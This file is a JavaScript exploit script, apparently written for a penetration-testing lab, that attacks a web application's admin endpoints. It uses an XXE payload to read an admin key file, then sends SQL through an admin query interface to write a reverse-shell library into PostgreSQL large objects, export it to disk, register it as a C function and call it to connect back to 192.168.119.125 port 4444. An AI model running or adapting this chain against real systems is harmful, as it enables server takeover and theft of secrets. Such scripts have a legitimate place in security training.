/*
var script = document.createElement('script');
script.src = 'https://code.jquery.com/jquery-3.4.1.min.js';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

fetch('https://reqres.in/api/users',{
    method: 'POST',
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify({
        name: 'User 1'
    })
})
.then(res => res.json())
.then(data => console.log(data))
*/

var nc_ip = "192.168.119.125";
var nc_port = "4444";
var loid = 1337;
//xxd rev_shell.dll | cut -d" " -f 2-9 | sed 's/ //g' | tr -d '\n' > rev_shell.dll.txt
var udf="";

var url= "/admin/query";
var admin_key = '';

//function to call inside ajax callback 
function set_admin_key(x){
    admin_key = x;
 }

function make_request(url, body){
    var resp;

    $.ajax({
        url : url,
        type : "POST",
        data: body,
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        async: false,
        success : function(responseText) {
            resp = responseText;
        }
     });

return resp;
}

function retrieve_admin_key() { 
    var url = "/admin/import";
    var body = "preview=true&xmldata=%3C%21--%3Fxml+version%3D%221.0%22+%3F--%3E%0D%0A%3C%21DOCTYPE+replace+%5B%3C%21ENTITY+ent+SYSTEM+%22file%3A%2F%2F%2Fhome%2Fstudent%2Fadminkey.txt%22%3E+%5D%3E%0D%0A%3Cdatabase%3E%26ent%3B%3C%2Fdatabase%3E";
    //var a = make_request(url, body);
  
    let admin_key = $(make_request(url, body)).find("database").text().replace(/\n/g, '');
    console.log("[+] Retrieved admin_key: "+admin_key+"...");
    set_admin_key(admin_key);
}

function delete_lo() {
    console.log("[+] Deleting existing LO...");
    body="adminKey="+admin_key+"&query=SELECT+lo_unlink%28"+loid+"%29";
    make_request(url, body);
}

function create_lo() {
    console.log("[+] Creating LO for UDF injection...");
    body = "adminKey="+admin_key+"&query=SELECT+lo_import($$C:\\windows\\win.ini$$,"+loid+")"; Windows
    make_request(url, body);
}

function inject_udf(){
   console.log("[+] Injecting payload of length %d into LO...");

   for ( let i = 0; i < ((udf.length-1)/4096)+1; i++ ){
         var udf_chunk = udf.substring(i*4096,(i+1)*4096);
         if(i == 0){
            body = "adminKey="+admin_key+"&query=UPDATE+PG_LARGEOBJECT+SET+data=decode($$"+udf_chunk+"$$,$$hex$$)+where+loid="+loid+"+and+pageno="+i+"";
         }
          else{
            body = "adminKey="+admin_key+"&query=INSERT+INTO+PG_LARGEOBJECT+(loid,pageno,data)+VALUES+("+loid+","+i+",decode($$"+udf_chunk+"$$,$$hex$$))";
          }

    make_request(url, body);
        }
}

function export_udf() {
    console.log("[+] Exporting UDF library to filesystem...");
    body = "adminKey="+admin_key+"&query=SELECT+lo_export("+loid+",$$//tmp//rev_shell.obj$$)";
    make_request(url, body);
}

function create_udf_func() {
    console.log("[+] Creating function...");
    body = "adminKey="+admin_key+"&query=create+or+replace+function+rev_shell(text,integer)+returns+VOID+as+$$//tmp//rev_shell.obj$$,$$connect_back$$+language+C+strict"; 
    make_request(url, body);
}

function trigger_udf() {
    console.log("[+] Launching reverse shell...");
    body = "adminKey="+admin_key+"&query=select+rev_shell($$"+nc_ip+"$$,"+nc_port+")";
    make_request(url, body);
}

function launch(){
    retrieve_admin_key();
    delete_lo();
    create_lo();
    inject_udf();
    export_udf();
    create_udf_func();
    trigger_udf();
}

//Slight dealay to let jquery load
setTimeout(launch,1000);